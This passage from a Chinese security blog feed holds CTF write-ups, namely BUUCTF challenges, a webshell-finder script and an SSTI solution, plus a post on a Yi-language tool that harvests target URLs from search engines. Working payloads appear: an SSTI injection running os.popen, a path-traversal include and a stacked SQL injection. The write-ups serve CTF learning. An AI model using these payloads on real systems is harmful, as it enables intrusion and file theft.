class="string">r&quot;D:\\phpStudy\\PHPTutorial\\WWW\\webshell&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileScan</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> FileQueue.empty():</span><br><span class="line">            file = FileQueue.get()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path + <span class="string">r&quot;\\\\&quot;</span> + file, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> readfile:</span><br><span class="line">                r = re.<span class="built_in">compile</span>(evalPattern)</span><br><span class="line">                <span class="keyword">for</span> (method, variable) <span class="keyword">in</span> r.findall(readfile.read()):</span><br><span class="line">                    WebShellQueue.put(&#123;</span><br><span class="line">                        <span class="string">&quot;file&quot;</span>: file,</span><br><span class="line">                        <span class="string">&quot;method&quot;</span>: method,</span><br><span class="line">                        <span class="string">&quot;variable&quot;</span>: variable</span><br><span class="line">                    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CheckWebShell</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> WebShellQueue.empty():</span><br><span class="line">                webShell = WebShellQueue.get()</span><br><span class="line">                <span class="keyword">if</span> webShell[<span class="string">&#x27;file&#x27;</span>][<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;xk&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> webShell[<span class="string">&quot;method&quot;</span>] == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">                        r = requests.get(url=<span class="string">&quot;http://127.0.0.1/webshell/&#123;&#125;?&#123;&#125;=echo \&quot;[*]\&quot;&quot;</span>.<span class="built_in">format</span>(webShell[<span class="string">&#x27;file&#x27;</span>], webShell[<span class="string">&#x27;variable&#x27;</span>]))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        data = &#123;webShell[<span class="string">&#x27;variable&#x27;</span>]: <span class="string">&quot;echo \&quot;[*]\&quot;&quot;</span>&#125;</span><br><span class="line">                        r = requests.post(url=<span class="string">&quot;http://127.0.0.1/webshell/&quot;</span> + webShell[<span class="string">&#x27;file&#x27;</span>], data=data)</span><br><span class="line">                    print(<span class="string">&quot;[-]Try: &#123;&#125;, Variable: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(webShell[<span class="string">&#x27;file&#x27;</span>], webShell[<span class="string">&#x27;variable&#x27;</span>]))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;[*]&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        print(<span class="string">&quot;[+]File found: &#123;&#125;, Variable: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(webShell[<span class="string">&#x27;file&#x27;</span>], webShell[<span class="string">&#x27;variable&#x27;</span>]))</span><br><span class="line">                        WebShellQueue.queue.clear()</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> FileQueue, WebShellQueue</span><br><span class="line">    fileQueueList = []</span><br><span class="line">    webShellQueueList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">        FileQueue.put(file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        th = FileScan()</span><br><span class="line">        fileQueueList.append(th)</span><br><span class="line">        th.start()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        th = CheckWebShell()</span><br><span class="line">        webShellQueueList.append(th)</span><br><span class="line">        th.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> th <span class="keyword">in</span> fileQueueList:</span><br><span class="line">        th.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> th <span class="keyword">in</span> webShellQueueList:</span><br><span class="line">        th.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>打开题目，随便点了一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;qaq?name&#x3D;&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>页面返回49，简单就可以知道此题的考点应该就是ssti。</p><p>在<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&amp;mid=2247485032&amp;idx=1&amp;sn=4d02daad3e8f4b8ff2588705b1253124&amp;chksm=9b3920d9ac4ea9cf3027463687b1650247d54b3ee41b21847bae57288a113213fbbd1b787e6b&amp;mpshare=1&amp;scene=23&amp;srcid=0821suYdj1zkuXFAvmHYBoLH&amp;sharer_sharetime=1598004613277&amp;sharer_shareid=8f9cdfd70d3578e6267cbd311a63ba7a#rd">网上</a>找了一个payload，成功读取flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;qaq?name&#x3D;&#123;&#123;a.__init__.__globals__.__builtins__.eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="后语"><a href="#后语" class="headerlink" title="后语"></a>后语</h1><p>今天刚打完了CISCN，关于php的题还是做不来出来，审计与phptrick方面还是不清楚，看来还得多刷题多学习呀。</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用易语言简单编写一款半自动URL采集工具</title>
      <link href="2020/%E7%94%A8%E6%98%93%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E7%BC%96%E5%86%99%E4%B8%80%E6%AC%BE%E5%8D%8A%E8%87%AA%E5%8A%A8URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
      <url>2020/%E7%94%A8%E6%98%93%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E7%BC%96%E5%86%99%E4%B8%80%E6%AC%BE%E5%8D%8A%E8%87%AA%E5%8A%A8URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间需要通过搜索引擎采集一些目标站，找了以前自己收集的一些工具，发现大多都失效了，没失效的也不怎么好用，思考了一下，还是决定自己来弄一个，这里借鉴的是法克论坛URL采集工具，这款工具在我电脑上失效了，感谢前辈们的工具。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>易语言</li><li>精益模块</li><li>精益web浏览器支持库</li><li>精益web浏览器填表模块</li></ul><a id="more"></a><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>首先是GUI部分，这里我们简单地规划出了浏览器操作区、配置区以及我们的输出区。</p><p><img src="https://img.0x002.com/article/e_URLCollect/gui.png" alt="GUI"></p><p>简单地规划出GUI之后开始编写我们的核心代码：</p><p><img src="https://img.0x002.com/article/e_URLCollect/core.png" alt="核心代码"></p><p>这里做了一些URL的处理，对于百度和搜狗这两个搜索引擎来说，他们的URL是经过处理的，不会直接显示在HTML内，故我们需要进行单独的访问并提取出真实URL。百度是返回的302跳转，真实URL在响应头的Location中，而搜狗是返回的200状态码，真实URL在页面内容中的script标签内。</p><p>由于易语言对于双引号的转义不太方便，这里我们为了方便选择使用长文本常量存储。</p><p><img src="https://img.0x002.com/article/e_URLCollect/init.png" alt="初始化"></p><p>以及针对百度的特殊处理：</p><p><img src="https://img.0x002.com/article/e_URLCollect/baidu.png" alt="百度"></p><p>剩下就是一些把功能拼起来，这里就略过不表。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">.版本 2</span><br><span class="line">.支持库 wke</span><br><span class="line">.支持库 spec</span><br><span class="line"></span><br><span class="line">.程序集 窗口程序集_启动窗口</span><br><span class="line">.程序集变量 采集状态, 逻辑型</span><br><span class="line">.程序集变量 搜索引擎取URL_正则, 文本型</span><br><span class="line">.程序集变量 Ajax状态, 逻辑型</span><br><span class="line"></span><br><span class="line">.子程序 取URL</span><br><span class="line">.参数 正则表达式, 文本型</span><br><span class="line">.局部变量 HTML源代码, 文本型</span><br><span class="line">.局部变量 取URL正则, 正则表达式类</span><br><span class="line">.局部变量 计次, 整数型</span><br><span class="line">.局部变量 URL, 文本型</span><br><span class="line">.局部变量 标记URL, 文本型, 静态</span><br><span class="line">.局部变量 miniblink填表, miniblink填表</span><br><span class="line">.局部变量 响应头, 文本型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ajax状态 ＝ 真</span><br><span class="line">HTML源代码 ＝ wke_Utf8ToAnsi (精易Web浏览器1.取网页源码 ())</span><br><span class="line">取URL正则.创建 (正则表达式, HTML源代码)</span><br><span class="line"></span><br><span class="line">.计次循环首 (取URL正则.取匹配数量 (), 计次)</span><br><span class="line"></span><br><span class="line">    URL ＝ 取URL正则.取子匹配文本 (计次, 1)</span><br><span class="line"></span><br><span class="line">    .如果真 (计次 ＝ 1)</span><br><span class="line">        .如果 (URL ≠ 标记URL)</span><br><span class="line">            标记URL ＝ URL</span><br><span class="line">            miniblink填表.web_SetWebView (精易Web浏览器1.取WebView ())</span><br><span class="line">            miniblink填表.web_SetScrollTop (99999)</span><br><span class="line">        .否则</span><br><span class="line">            跳出循环 ()</span><br><span class="line">        .如果结束</span><br><span class="line"></span><br><span class="line">    .如果真结束</span><br><span class="line"></span><br><span class="line">    .如果真 (搜索引擎_组合框.内容 ＝ “百度”)</span><br><span class="line">        网页_访问_对象 (URL, 2, , , , , 响应头, , 真, , , , , , )</span><br><span class="line">        URL ＝ 文本_取右边 (文本_取指定变量文本行 (响应头, 8), “Location: ”)</span><br><span class="line">    .如果真结束</span><br><span class="line">    .如果真 (搜索引擎_组合框.内容 ＝ “搜狗”)</span><br><span class="line">        调试输出 (URL)</span><br><span class="line">        URL ＝ 文本_取出中间文本 (到文本 (网页_访问_对象 (“https:&#x2F;&#x2F;www.sogou.com” ＋ URL, 0)), “&lt;a href&#x3D;” ＋ #引号, #引号 ＋ “ id&#x3D;”, 0, 假)</span><br><span class="line">    .如果真结束</span><br><span class="line"></span><br><span class="line">    URL输出框.内容 ＝ URL输出框.内容 ＋ URL ＋ #换行符</span><br><span class="line">.计次循环尾 ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 搜索引擎初始化, 文本型</span><br><span class="line">.参数 所选引擎, 文本型</span><br><span class="line">.参数 关键字, 文本型</span><br><span class="line"></span><br><span class="line">.如果真 (所选引擎 ＝ “Google”)</span><br><span class="line">    搜索引擎取URL_正则 ＝ #取URL正则表达式_Google</span><br><span class="line">    返回 (“https:&#x2F;&#x2F;www.google.com&#x2F;search?q&#x3D;” ＋ 关键字)</span><br><span class="line">.如果真结束</span><br><span class="line">.如果真 (所选引擎 ＝ “百度”)</span><br><span class="line">    搜索引擎取URL_正则 ＝ #取URL正则表达式_百度</span><br><span class="line">    返回 (“https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;” ＋ 关键字)</span><br><span class="line">.如果真结束</span><br><span class="line">.如果真 (所选引擎 ＝ “Bing”)</span><br><span class="line">    搜索引擎取URL_正则 ＝ #取URL正则表达式_Bing</span><br><span class="line">    返回 (“https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;” ＋ 关键字)</span><br><span class="line">.如果真结束</span><br><span class="line">.如果真 (所选引擎 ＝ “360搜索”)</span><br><span class="line">    搜索引擎取URL_正则 ＝ #取URL正则表达式_360搜索</span><br><span class="line">    返回 (“https:&#x2F;&#x2F;www.so.com&#x2F;s?j&#x3D;1&amp;q&#x3D;” ＋ 关键字)</span><br><span class="line">.如果真结束</span><br><span class="line"></span><br><span class="line">搜索引擎取URL_正则 ＝ #取URL正则表达式_搜狗</span><br><span class="line">返回 (“https:&#x2F;&#x2F;www.sogou.com&#x2F;web?query&#x3D;” ＋ 关键字)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 _开始采集_按钮_被单击</span><br><span class="line"></span><br><span class="line">.如果 (采集状态 ＝ 假 且 关键字_编辑框.内容 ≠ “”)</span><br><span class="line">    采集状态 ＝ 真</span><br><span class="line">    精易Web浏览器1.浏览网页 (搜索引擎初始化 (搜索引擎_组合框.内容, 关键字_编辑框.内容))</span><br><span class="line">    开始采集_按钮.标题 ＝ “停止采集”</span><br><span class="line">.否则</span><br><span class="line">    采集状态 ＝ 假</span><br><span class="line">    开始采集_按钮.标题 ＝ “开始采集”</span><br><span class="line">.如果结束</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 __启动窗口_创建完毕</span><br><span class="line">.局部变量 输出, 文本型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">采集状态 ＝ 假</span><br><span class="line">Ajax状态 ＝ 假</span><br><span class="line">Initialize ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 _精易Web浏览器1_文档就绪</span><br><span class="line">.参数 就绪框架ID, 整数型</span><br><span class="line"></span><br><span class="line">.如果真 (采集状态 ＝ 真)</span><br><span class="line">    取URL (搜索引擎取URL_正则)</span><br><span class="line">.如果真结束</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 _精易Web浏览器1_URL被改变</span><br><span class="line">.参数 URL, 文本型</span><br><span class="line">.参数 所属框架ID, 整数型</span><br><span class="line">.局部变量 所选引擎, 文本型</span><br><span class="line"></span><br><span class="line">所选引擎 ＝ 搜索引擎_组合框.内容</span><br><span class="line">.如果真 (所选引擎 ＝ “百度” 且 Ajax状态 ＝ 真)</span><br><span class="line">    精易Web浏览器1.浏览网页 (URL)</span><br><span class="line">    Ajax状态 ＝ 假</span><br><span class="line">.如果真结束</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="为什么要用易语言来编写？"><a href="#为什么要用易语言来编写？" class="headerlink" title="为什么要用易语言来编写？"></a>为什么要用易语言来编写？</h2><p>1、之前学过一点易语言，有基础</p><p>2、第三方优秀模块多，类似功能实现起来应该不难</p><p>3、精益论坛日活量高，大佬多且热心帮助他人</p><p>4、软件GUI可视化生成，懒狗必备</p><h2 id="关于我与易语言之间"><a href="#关于我与易语言之间" class="headerlink" title="关于我与易语言之间"></a>关于我与易语言之间</h2><p>易语言是我学的第一门”编程语言“，想起来还是我高一高二的事情，易语言带我进入的编程的世界（菜狗不会英语），我很感谢她，虽说她的名声并不好听，但在我看来，易语言亦如一把宝剑，能杀人亦能救人。不管黑猫白猫，能抓到老鼠的猫就是好猫，易语言有精益模块等非常优秀的第三方模块，以及日活量挺高且求助区活跃大佬多的精益社区，这么看起来也并非完全不推荐学习。</p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> URL采集 </tag>
            
            <tag> 易语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百道CTF刷题记录(二)之BUUCTF</title>
      <link href="2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)%E4%B9%8BBUUCTF/"/>
      <url>2020/%E7%99%BE%E9%81%93CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)%E4%B9%8BBUUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近好久没刷CTF题了，其实BUUCTF这个平台我也是最开始的用户之一(uid前20，懒狗石锤了…)，可是一直没有时间能够好好的刷题，今儿总算时间充裕，打算花些时日，记录下自己在BUU刷题的经验。</p><h1 id="刷题之旅"><a href="#刷题之旅" class="headerlink" title="刷题之旅"></a>刷题之旅</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开题目页面，习惯性右键查看HTML源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--source.php--&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>得提示：source.php，访问之~得到源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            </span><br><span class="line">           <span class="comment">// 判断参数是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 白名单判断</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 字符串切割，截取?之前的字符串，若无则不截取</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>) <span class="comment">//末尾添加?防止未找到报错</span></span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 白名单判断</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Url解码</span></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 再次切割</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 白名单判断</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>source.php?file=hint.php</code>得到提示：<code>flag not here, and flag in ffffllllaaaagggg</code></p><p>本题难点就是得想到如何利用字符串切割绕开白名单判断且能任何文件包含，其实也很简单：<code>source.php?file=hint.php?/../任意文件</code>即可。</p><p>EXP: <code>source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>注入题，老规矩，先来个单引号试试：</p><p><img src="https://img.0x002.com/article/BuuCTF/20200721181223.png" alt="题目页面"></p><p>尝试老套路拼接<code>union select</code>之后发现被拦截了，拦截代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>发现<code>select</code>被禁止了，这种情况下，通常的注入方法，如<code>盲注</code>、<code>报错注入</code>等都在这不好使了。</p><p>直接说解法吧，这里是<code>堆叠注入</code>。</p><p>爆库：<code>1&#39;;show databases;#</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span 